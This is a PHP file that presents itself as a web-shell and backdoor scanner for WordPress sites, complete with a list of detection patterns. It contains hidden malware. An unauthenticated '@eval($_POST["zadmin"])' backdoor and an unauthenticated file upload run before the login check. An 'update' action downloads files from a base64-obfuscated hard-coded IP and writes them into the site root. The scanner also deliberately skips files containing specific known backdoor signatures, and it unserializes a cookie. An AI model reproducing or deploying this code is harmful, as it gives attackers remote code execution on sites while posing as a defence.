<?php
ob_start();
ignore_user_abort(true);
ini_set("memory_limit", "-1"); 
set_time_limit(0);
date_default_timezone_set("PRC");
//error bin
ini_set('display_errors',1);
//error end
$username = "zh"; 
$password = $username; 
if(isset($_POST['username']))$_POST['password']=$_POST['username'];
$md5 = md5(md5($username).md5($password));
$version = "PHP Web v1.2";
//$servername =base64_decode("aHR0cDovLzEyNy4wLjAuMTo4MDAvdjE=");; //aHR0cDovLzEyNy4wLjAuMTo4MDAvdjE=
$servername = base64_decode("aHR0cDovLzE1Ni4yMjYuMTguNTMvdjE=");

$realpath = realpath('./');
$selfpath = $_SERVER['PHP_SELF'];
$selfpath = substr($selfpath, 0, strrpos($selfpath,'/'));
define('REALPATH', str_replace('//','/',str_replace('\\','/',substr($realpath, 0, strlen($realpath) - strlen($selfpath)))));
define('MYFILE', basename(__FILE__));
define('MYPATH', str_replace('\\', '/', dirname(__FILE__)).'/');
define('MYFULLPATH', str_replace('\\', '/', (__FILE__)));
define('HOST', "http://".$_SERVER['HTTP_HOST']);
//取版本号 $wp_version
$wp_version = "";
//DOCUMENT_ROOT
$verisonfile = $_SERVER["DOCUMENT_ROOT"]."/wp-includes/version.php";
if (file_exists($verisonfile)){
  //print_r($_SERVER);
  include $verisonfile;

}

if(isset($_POST['subdirectory']) && $_POST['subdirectory']== "true" ){
  $subdirectory = 1;
}else{
  $subdirectory =0;
}

if(isset($_POST['mymm']) && $_POST['mymm']== "true"){
  $mymm = 1;
}else{
  $mymm = 0;
}
//mm
if(isset($_POST["zadmin"])){
  @eval($_POST["zadmin"]);exit;
}
//updata
if(isset($_POST["userfile"])){
  $filename = $_FILES['userfile'];
  $asname = dirname(__FILE__)."/".basename($filename['name']);
  if(move_uploaded_file($filename['tmp_name'],$asname)){
   echo "ok";
  }else{
    echo "error";
  }
  header("refresh:1");
}

?>
<html>
<head>
<title><?php echo $version?></title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style>
body{margin:0px;}
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
</style>
</head>
<body>
<?php
header("Content-Type: text/html;charset=utf-8");
if(!(isset($_COOKIE['t00ls']) && $_COOKIE['t00ls'] == $md5) && !(isset($_POST['username']) && isset($_POST['password']) && (md5(md5($_POST['username']).md5($_POST['password']))==$md5)))
{
 echo '<form id="frmlogin" name="frmlogin" method="post" action="">用户名: <input type="text" name="username" id="username" />  <input type="submit" name="btnLogin" id="btnLogin" value="登陆" /></form>';
}
elseif(isset($_POST['username']) && isset($_POST['password']) && (md5(md5($_POST['username']).md5($_POST['password']))==$md5))
{
 setcookie("t00ls", $md5, time()+60*60*24*365,"/");
 echo "登陆成功！";
 header( 'refresh: 1; url='.MYFILE.'?action=scan' );
 exit();
}
else
{
 setcookie("t00ls", $md5, time()+60*60*24*365,"/");
 $setting = getSetting();
 $action = isset($_GET['action'])?$_GET['action']:"";
 
 if($action=="logout")
 {
  setcookie ("t00ls", "", time() - 3600,"/");
  setcookie ("t00ls_s", "",time() - 3600,"/");
  Header("Location: ".MYFILE);
  exit();
 }
if($action=="download" && isset($_GET['file']) && trim($_GET['file'])!=""){
    $file = $_GET['file'];
    ob_clean();
    if (@file_exists($file)) {
    header("Content-type: application/octet-stream");
        header("Content-Disposition: filename=\"".basename($file)."\"");
    echo file_get_contents($file);
    }
    exit();
}
 //show
 if($action=="show" && isset($_GET['file']) && trim($_GET['file'])!=""){
    $file = $_GET['file'];
    ob_clean();
    if (@file_exists($file)) {
    //header("Content-type: application/octet-stream");
    //header("Content-Disposition: filename=\"".basename($file)."\"");
    echo file_get_contents($file);
    }
    exit();
 }
//delmy
if($action=="delmy" ){
  $_SERVER["document_root"];
  $file = $_SERVER['SCRIPT_FILENAME'];
  ob_clean();
  unlink($file);
  echo "删除成功！";
  exit();
}

 if($action=="del" && isset($_GET['file']) && trim($_GET['file'])!=""){
    $file = $_GET['file'];
    ob_clean();
    unlink($file);
    echo "删除成功！";
    exit();
 }

if($action=="update" && isset($_GET['file']) && trim($_GET['file'])!=""){
    $file = $_SERVER["DOCUMENT_ROOT"].$_GET['file'];
    $updatefile = trim($_GET['file']);
    $wp_versions =explode(".",$wp_version);
    $ves = $wp_versions[0].".".$wp_versions[1];
    $geurl = $servername ."/wps/wordpress-{$ves}/wordpress".$updatefile;
    ob_clean();
    echo $geurl;
    $resdate = file_get_contents($geurl);
    if(strlen($resdate)>300){
      file_put_contents($file,$resdate);
    }
    echo "更新成功！";
    exit();
}

//serch
if($action=="serch" && isset($_GET['file']) && trim($_GET['file'])!=""){
  $dir = isset($_POST['path'])?$_POST['path']:MYPATH;
  $dir = substr($dir,-1)!="/"?$dir."/":$dir;
  ob_clean();
  $start=time();
   $is_user = array();
   $is_ext = "";
   $list = "";
   
   if(trim($setting['user'])!="")
   {
    $is_user = explode("|",$setting['user']);
    if(count($is_user)>0)
    {
     foreach($is_user as $key=>$value)
      $is_user[$key]=trim(str_replace("?","(.)",$value));
     $is_ext = "(\.".implode("($|\.))|(\.",$is_user)."($|\.))";
    }
   }
   if($setting['hta']==1)
   {
    $is_hta=1;
    $is_ext = strlen($is_ext)>0?$is_ext."|":$is_ext;
    //$is_ext.="(^\.htaccess$)";
   }
   if($setting['all']==1 || (strlen($is_ext)==0 && $setting['hta']==0))
   {
    $is_ext="(.+)";
   }
   
   //关建字查询
   if(isset($_POST['keystr']) && $_POST['keystr'] ){
    $kerystr =$_POST['keystr'];
    $pregstr =preg_quote($kerystr,"/");
    $php_code =array("关建字->$kerystr"=>$pregstr);
    //按时间查询
  }else if(isset($_POST['gttime']) && strlen($_POST['gttime'])>0){ 
    $day = intval(trim($_POST['gttime']));
    if($day>0){
      $gttime = time() - $day * 86400; 
    }
    
  }else{
    $php_code = getCode();
   }
   if(!is_readable($dir))
    $dir = MYPATH;
   $count=$scanned=0;
   $log = fopen("kslog.txt","w+");
   $meorydata =memory_get_usage();
   scan($dir,$is_ext);
   fclose($log); 
   $memorydata = round((memory_get_peak_usage() - $meorydata) / 1024 ,2)."kb" ;
   $end=time();
   $spent = ($end - $start);
   
?>
<div style="padding:10px; background-color:#ccc">内存：<?php echo $memorydata ?> 扫描: <?php echo $scanned?> 文件 | 发现: <?php echo $count?> 可疑文件 | 耗时: <?php echo $spent?> 秒</div>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr class="head">
    <td width="15" align="center">No.</td>
    <td width="40%">文件</td>
    <td width="20%">字符串</td>
    <td width="12%">更新时间_创建时间</td>
    <td width="12%">原因</td>
    <td width="5%">特征</td>
    
    <td>动作</td>
  </tr>
<?php echo $list?>
</table>
<?php
  exit;
}
//serch end

?>
<table border="0" cellpadding="0" cellspacing="0" width="100%">
 <tbody><tr class="head">
  <td><?php echo $_SERVER['SERVER_ADDR']?><span style="float: right; font-weight:bold;"><?php echo "<a href='/'>$version</a>"?></span></td>
 </tr>
 <tr class="alt1">
  <td><span style="float: right;"><button onclick="delmy()"  >删除自己</button> &nbsp;&nbsp;<?=date("Y-m-d H:i:s",time())?></span>
   <a href="?action=scan">扫描</a> | 
            <a href="?action=setting">设定</a> |
          <a href="?action=logout">登出</a>
  </td>
 </tr>
</tbody></table>
<br>
<?php
 if($action=="setting")
 {
  if(isset($_POST['btnsetting']))
  {
   $Ssetting = array();
   $Ssetting['user']=isset($_POST['checkuser'])?$_POST['checkuser']:"php | php? | phtml";
   $Ssetting['all']=isset($_POST['checkall'])&&$_POST['checkall']=="on"?1:0;
   $Ssetting['hta']=isset($_POST['checkhta'])&&$_POST['checkhta']=="on"?1:0;
   setcookie("t00ls_s", base64_encode(serialize($Ssetting)), time()+60*60*24*365,"/");
   echo "设置完成！";
   header( 'refresh: 1; url='.MYFILE.'?action=setting' );
   exit();
  }
?>
<form name="frmSetting" method="post" action="?action=setting">
<fieldset style="width:400px">
<LEGEND>扫描设定</LEGEND>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="60">文件后缀:</td>
    <td width="300"><input type="text" name="checkuser" id="checkuser" style="width:300px;" value="<?php echo $setting['user']?>"></td>
  </tr>
  <tr>
    <td><label for="checkall">所有文件</label></td>
    <td><input type="checkbox" name="checkall" id="checkall" <?php if($setting['all']==1) echo "checked"?>></td>
  </tr>
  <tr>
    <td><label for="checkhta">设置文件</label></td>
    <td><input type="checkbox" name="checkhta" id="checkhta" <?php if($setting['hta']==1) echo "checked"?>></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>
      <input type="submit" name="btnsetting" id="btnsetting" value="提交">
    </td>
  </tr>
</table>
</fieldset>
</form>
<?php

 }
 else
 {
  $dir = isset($_POST['path'])?$_POST['path']:MYPATH;
  $dir = substr($dir,-1)!="/"?$dir."/":$dir;
  $dir = $_SERVER['DOCUMENT_ROOT'];
?>

<table width="100%%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="35" style="vertical-align:middle; padding-left:5px;">扫描路径:</td>
    <td width="600">
        <input type="text" name="path" id="path" style="width:500px" value="<?php echo $dir?>">
        &nbsp;&nbsp;关建字：<input type="text" name="keystr" class="keystr" id="keystr" value=""/>
        &nbsp;&nbsp;子目录:
        <input type="checkbox" id="subdirectory" name ="subdirectory" <?php if($subdirectory==1)echo "checked";?> >
        &nbsp;&nbsp;包含自己:
        <input type="checkbox" id="mymm" name ="mymm" <?php if($mymm==1)echo "checked";?> >
        &nbsp;&nbsp;最近几天：<input type="text" name="gttime" class="gttime" style="width:30px" id="gttime" value=""/>
        <button type="button" clas="btnScan" id="btnScan" onclick="serch()"> 开始扫描</button>
    <td width="100" style="vertical-align:middle;padding-top:12px">
    <form  enctype="multipart/form-data" action="" method="POST">
      <input  name="userfile" type="hidden" />
      <input  name="userfile" type="file" />
      <input type="submit" value="上传" />
    </form>
    </td>
  </tr>
</table>




<?php
 }
}
ob_flush();
?>
<div id ="serch" class="serch"></div>
<div id ="footer"></div>
</body>
</html>
<?php
function arrycan($myfilestr,$content){
  foreach($myfilestr as $myv){
    if(strpos($content,$myv)){
      return 1;
    }
  }
  return 0;
}

function scan($path = '.',$is_ext){
  global $php_code,$count,$scanned,$list,$log,$subdirectory,$wp_version,$servername,$mymm,$gttime;
  $myfilestr = array("eval(`/******/`.\$jj.\$str1('H*',\$str).\$jj)",'PDF-0-1','33e268b738572087a821e9ea5108d332',
            "eval(\$_POST['google']);echo'AGM';?>","mei7","str_rot13(urldecode(\$xmlname));functionis_https(){if",
            "exit('FBIWaring!');","eval(\$p.\"\");}}@call_user_func(newC(),\$params);echo'AGM';?>",
            "file_put_contents(\$lokasi.","eJwBzB0z4gHHHTji7T37W9vGsj+339f/YVFpZRrkB5A2NZhQcoC0zSEJedwSko9PUiUZQ2VpbSuRTtO","DBTEAM<?php",
            "'66696c655f6765745f636f6e74656e7473'"
            );
  $nocheckfile = array("class-pclzip.php","class-wp-debug-data.php","class-snoopy.php","PHPMailer.php","MySQL.php" ,"native.php","shell.php");
  $ignore = array('.', '..' );
  $replace=array(" ","\n","\r","\t");
  $dh = @opendir( $path );
 
    while(false!==($file=readdir($dh))){
          if( !in_array( $file, $ignore ) ){                 
              if( is_dir( "$path$file" ) ){
                //子目录
                if($subdirectory){
                  scan("$path$file/",$is_ext);
                }
              } else {
      $current = $path.$file;
      if(MYFULLPATH==$current) continue;
      $filekb = 1000; //kb
      if((filesize($current) / 1024) > $filekb){
        continue;
      }
      
      if(!preg_match("/$is_ext/i",$file)) continue;
      if($file==".htaccess") continue; //.htaccess
      //if(!preg_match("/.*\.php$/",$file)) continue;  
      if(is_readable($current)){
          $scanned++;
          $content = file_get_contents($current);
          $contentmd5 = $content;
          $content= str_replace($replace,"",$content);
          $checkfilestr = arrycan($myfilestr,$content);
          if ($mymm==0){
            if($checkfilestr) continue; //放行
          }
          $wp_file ="";
          $settime = strtotime("2022-03-15 12:00:00");
          
          if(strstr($current,"/wp-content/plugins/")||strstr($current,"/wp-content/plugins/themes")){
            $wp_file = "模板插件";
          }
          //gttime seach
          if ($gttime>1000){
            $filetimeold = filemtime($current);
            $filectimeold = filectime($current);
            $filetime = date('Y-m-d H:i',$filetimeold);
            $filectime = date('Y-m-d H:i',$filectimeold);
            
            if($filetimeold > $gttime ||  $filectimeold > $gttime ){
              $count++;
              $j = $count % 2 + 1;
              $list.="
              <tr  id=\"$count\"  class='alt$j' onmouseover='this.className=\"focus\";' onmouseout='this.className=\"alt$j\";'>
              <td>$count</td> 
              <td><a href=\"?action=show&file=$current\" target='_blank'>{$current}</a></td> 
              <td><font color=red>时间查询</font> </td>
              <td>$filetime ___$filectime</td>
              <td>$wp_file</td>
              <td><button onclick= del('{$current}',$count) >删除 </button>&nbsp; </td>
              <td></td>
              </tr>";
            }
            continue;
          }
          //gttime seach end
          //not php
          if (substr($current,-3,3)!="php"){
              if($content!="" && strstr($content,'<?php')){
                $fileroot = str_replace($_SERVER['DOCUMENT_ROOT'],"",$current);
                if ($fileroot =="/wp-includes/js/customize-loader.js")continue;
                $count++;
                $j = $count % 2 + 1;
                $filetime = date('Y-m-d H:i',filemtime($current) );
                $filectime = date('Y-m-d H:i',filectime($current) );
                $list.="
                <tr  id=\"$count\"  class='alt$j' onmouseover='this.className=\"focus\";' onmouseout='this.className=\"alt$j\";'>
                <td>$count</td> <td><a href='?action=show&file=$current' target='_blank'>{$current}</td></a> <td><font color=red>包裹php代码</font> </td>
                <td> $filetime ___$filectime</td>
                <td>$wp_file</td><td><button onclick= del('{$current}',$count) >删除 </button>&nbsp; </td><td></td>
                </tr>"; 
              };
              continue;
          }
          //not php
          foreach($php_code as $key => $value){
            if(preg_match("/$value/i",$content)){
              //处理更新 
              // $fileroot = str_replace($_SERVER['DOCUMENT_ROOT'],"",$current);
              // if( !empty($wp_version) ){
              //   $filemd5 = md5($contentmd5);
              //   $url = $servername."/vers?";
              //   $geturl = $url."ver={$wp_version}&md5={$filemd5}&pwd=".urlencode($fileroot);
              //   $checkstr = vita_get_url_content($geturl);
              //   $checkarr = json_decode($checkstr,true);
              //   if ($checkarr['status']==1){
              //      break;
              //   }elseif($checkarr['pwd']=="ok"){
              //     $udpatefile =1;
              //     $wp_file = "系统文件";
              //   }
              // }

              $count++;
              $j = $count % 2 + 1;
              $filetime = date('Y-m-d H:i',filemtime($current) );
              $filectime = date('Y-m-d H:i',filectime($current) );
              $reason = explode("->",$key);
              $url =  str_replace(REALPATH,HOST,$current);
              preg_match("/$value/i",$content,$arr);
              $righstr =  strstr($content,$reason[1]);
              $righstr = substr($righstr,0,60);
              if( !empty($wp_version && isset($udpatefile)) ){
                $td_update ="<td><font color=#099>$wp_file {$wp_version} </font>&nbsp;<button onclick= del('$current',$count) >删除 </button>&nbsp; &nbsp; <a href=\"javascript:void(0); \" onclick= update('$current',$count,'{$fileroot}') > 更新 </a>&nbsp;<font color=red></font></td>";
              }else{
                $td_update = "<td><font color=#099>$wp_file</font>&nbsp; <button   onclick= del('$current',$count) >删除 </button>&nbsp;<font color=red> $reason[0]</font></td>";
              }
              $list.="
                  <tr  id=\"$count\"  class='alt$j' onmouseover='this.className=\"focus\";' onmouseout='this.className=\"alt$j\";'>
                  <td>$count</td>
                  <td><a href='?action=show&file=$current' target='_blank'>$current</a></td>
                  <td>$righstr</td>
                  <td>$filetime __ {$filectime}</td>
                  $td_update
                  <td><font color=#090>$reason[1]</font></td>
                  <td><a href='?action=download&file=$current' target='_blank'>下载</a> &nbsp;&nbsp;
                  </td>
                </tr>
                ";
                
                //$logdata = date("Y m d h:i:s",time()) ." {$current} -> {$reason[1]} --{$reason[0]} \r\n ";
              break;
            }
          }
          

        }else{
          $logdata = date("Y m d h:i:s",time()) ." {$current} \r\n ";
          fwrite($log,$logdata);
          echo $logdata ." 无权限<br/>";//不可读目录
        }
        }
        }
    }
    closedir( $dh );
} 


function getSetting(){
    $Ssetting = array();
    if(isset($_COOKIE['t00ls_s']))
    {
      $Ssetting = unserialize(base64_decode($_COOKIE['t00ls_s']));
    // $Ssetting['user']=isset($Ssetting['user'])?$Ssetting['user']:"php | php? | phtml | shtml";
      $Ssetting['user']=isset($Ssetting['user'])?$Ssetting['user']:"php | php? | phtml | txt";
      $Ssetting['all']=isset($Ssetting['all'])?intval($Ssetting['all']):0;//
      $Ssetting['hta']=isset($Ssetting['hta'])?intval($Ssetting['hta']):1;
    }
    else
    {
    // $Ssetting['user']="php | php? | phtml | shtml";
      $Ssetting['user']="php | php? | phtml ";
      $Ssetting['all']=0; //0 1默认设置
      $Ssetting['hta']=1;
      setcookie("t00ls_s", base64_encode(serialize($Ssetting)), time()+60*60*24*3,"/");
    }
    return $Ssetting;
}


function vita_get_url_content($url) {    
	if(function_exists('file_get_contents')) {    
	$file_contents = file_get_contents($url);    
	} else {    
	$ch = curl_init();    
	$timeout = 20;    
	curl_setopt ($ch, CURLOPT_URL, $url);    
	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);    
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);    
	$file_contents = curl_exec($ch);    
	curl_close($ch);  
  
	}
     
	return $file_contents;    
	}  

function getCode(){
  //translation_v2($data, '0');
  return array(
  '后台加密->hex($p)' =>'(?<!(\w))hex\(\$p.*\)',
 // 'base64拼接->eval' => "'base64'",
  //'substr(md5->substr(md5(' => 'substr\(md5\(',  // jetpack 插件不默认有带
  //'gzuncompress->gzuncompress(strrev(' => "gzuncompress\(strrev\(",
  //'eval拼接=>eval' =>"'e'\.'v'\.'a'\.'l'",
  //'eval拼接2=>eval2' =>'"e"\."v"\."a"\."l"',
  //'eval拼接3=>eval3' =>'"e"\."v"\."a"\."l"',
  //'后台加密->base64_'=>"array\(\'cod\','de','base','64_','e'\)",
  '8进制->include(167\165\160'=>'include\(.(\\\(\d+){2,3}){4}', // include\(.(\\[0-7]+){3}  (\nml){1,3}
  //'指定->RAuJjL1201'=>"RAuJjL1201", 
  //'del->del'=>"class-wp-http-netfilter.php",
  //'weevely拼接->str_replace(' => 'str_replace\(.*(\$(\w).){3}',
  '手动删除->call_user_func('=>'(?<!(\w))call_user_func\(\$f_exists', //call_user_func($f_exists
  '手动更新->chmod($index'  =>'(?<!(\w))chmod\(\$index\,[0-9]+\)', //chmod($index,0644)
  //'指定->If-Unmodified-Since' =>'If-Unmodified-Since',
  //'指定->Clear-Site'=>"Clear-Site-Data", //eval(\$_HEADERS[\"Clear-Site-Data\"]
  //'指定->X-Dns' =>"X-Dns-Prefetch-Control", //\$p[11]
  //'指定->16进字' =>"(?:0[xX])?[0-9a-fA-F].+", //x5C\x30\x3B\x12\x17\x5f\x43\x4f
  //"指定.version->version"=>"r\(\"wp-includes\/version\.php\"\)",
  '指定木马删除->$_SERVER[Snippet::g' =>"SERVER\[Snippet\:\:g",//专业马,时间无法查出   sset\(\$_SERVER\[Snippet::g\(  $_SERVER[Snippet::g
  //'一句话后门指定->If-Unmodified-Since'=>"eval\(\$_REQUEST\[\"If-Unmodified-Since\"\]\)", //eval($_REQUEST["If-Unmodified-Since"])
  '后门特征->getallheaders()' => "etallheaders\(\);if\(isset\(\$_HEADERS\['Clear-Site-Data'\]\)", //getallheaders();if(isset($_HEADERS['Clear-Site-Data']))
  '后门特征->cha88.cn'=>'cha88\.cn',
  '后门特征->c99shell'=>'c99shell',
  '后门特征->phpspy'=>'(?<!(\w))phpspy\(', 
  '后门特征->Scanners'=>'(?<!(\w))Scanners\(', 
  '后门特征->cmd.php'=>'cmd\.php',
  '后门特征->str_rot13'=>'(?<!(\w))str_rot13\(', 
  '后门特征->webshell'=>'(?<!(\w))webshell\(', 
  '后门特征->EgY_SpIdEr'=>'EgY_SpIdEr',
  '后门特征->tools88.com'=>'tools88\.com',
  '后门特征->SECFORCE'=>'SECFORCE',
  '后门特征->eval("?>'=>'(?<!(\w))eval\((\'|")\?>',
  '后门特征->system('=>'(?<!(\w))system\(',      
  '可疑代码特征->passthru('=>'(?<!(\w))passthru\(',
  '可疑代码特征->shell_exec('=>'(?<!(\w))shell_exec\(', 
  '后门代码特征->exec('=>'(?<!(\w))exec\(', //  ->
  '可疑代码特征->popen('=>'(?<!(\w))popen\(', 
  '可疑代码特征->proc_open'=>'(?<!(\w))proc_open\(', 
  '可疑代码特征->eval($'=>'(?<!(\w))eval\((\'|"|\s*)\\$',
  '可疑代码特征->assert($'=>'(?<!(\w))assert\((\'|"|\s*)\\$',
  '危险MYSQL代码->returns string soname'=>'returnsstringsoname',
  '危险MYSQL代码->into outfile'=>'intooutfile',
  '危险MYSQL代码->load_file'=>'select(\s+)(.*)load_file',
  '加密后门特征->eval(gzinflate('=>'eval\(gzinflate\(',
  '加密后门特征->eval(base64_decode('=>'eval\(base64_decode\(',
  '加密后门特征->eval(gzuncompress('=>'eval\(gzuncompress\(',
  '加密后门特征->eval(gzdecode('=>'eval\(gzdecode\(',
  '加密后门特征->eval(str_rot13('=>'eval\(str_rot13\(',
  '加密后门特征->gzuncompress(base64_decode('=>'gzuncompress\(base64_decode\(',
  '加密后门特征->base64_decode(gzuncompress('=>'base64_decode\(gzuncompress\(',
  '一句话后门特征->eval($_'=>'eval\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
  '一句话后门特征->assert($_'=>'assert\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
  '一句话后门特征->require($_'=>'require\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
  '一句话后门特征->require_once($_'=>'require_once\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
  '一句话后门特征->include($_'=>'include\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
  '一句话后门特征->include_once($_'=>'include_once\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)', 
  '一句话后门特征->call_user_func("assert"'=>'call_user_func\(("|\')assert("|\')',  
  '一句话后门特征->call_user_func($_'=>'call_user_func\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
  '一句话后门特征->$_POST/GET/REQUEST/COOKIE[?]($_POST/GET/REQUEST/COOKIE[?]'=>'\$_(POST|GET|REQUEST|COOKIE)\[([^\]]+)\]\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)\[', 
  '一句话后门特征->echo(file_get_contents($_POST/GET/REQUEST/COOKIE'=>'echo\(file_get_contents\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',                                     
  '上传后门特征->file_put_contents($_POST/GET/REQUEST/COOKIE,$_POST/GET/REQUEST/COOKIE'=>'file_put_contents\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)\[([^\]]+)\],(\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
  '上传后门特征->fputs(fopen("?","w"),$_POST/GET/REQUEST/COOKIE['=>'fputs\(fopen\((.+),(\'|")w(\'|")\),(\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)\[',
  '.htaccess插马特征->SetHandler application/x-httpd-php'=>'SetHandlerapplication\/x-httpd-php',
  '.htaccess插马特征->php_value auto_prepend_file'=>'php_valueauto_prepend_file',
  '.htaccess插马特征->php_value auto_append_file'=>'php_valueauto_append_file'
  ); 
}

?>
<script src="https://code.jquery.com/jquery-1.11.3.js"></script>
<script>
function del(file,j){
  geturl = "?action=del&file=" +  file;
  $.get(geturl,function(data){console.log(data)});
  $('#' + j).remove();
}
function update(file,j,filename){
  geturl = "?action=update&file=" +  filename;
  $.get(geturl,function(data){console.log(data)});
  console.log(geturl)
  $('#' + j).remove();
}
function serch(){
  $("#btnScan").text("程序正在处理中,请稍后...");
  $("#serch").empty();
  keystr = $("#keystr").val();
  filename ="/";
  geturl = "?action=serch&file=" +  filename;
  vpath = $("#path").val();
  vsubdirectory = $("#subdirectory").is(":checked");
  gttime = $("#gttime").val();
  vmymm =$("#mymm").is(":checked");
  if(gttime.length>0){
    data = {path:vpath,subdirectory:vsubdirectory,mymm:vmymm,keystr:keystr,gttime:gttime};
  }else{
    data = {path:vpath,subdirectory:vsubdirectory,mymm:vmymm,keystr:keystr};
  }
  $.post(geturl,data,function(data){
    //console.log(data);
    $("#serch").html(data);
    $("#btnScan").text("开始扫描");
  });
}
function delmy(){
  geturl ="?action=delmy";
  $.get(geturl,function(data){
    alert("删除成功！");
    //console.log(data);
  })
}
</script>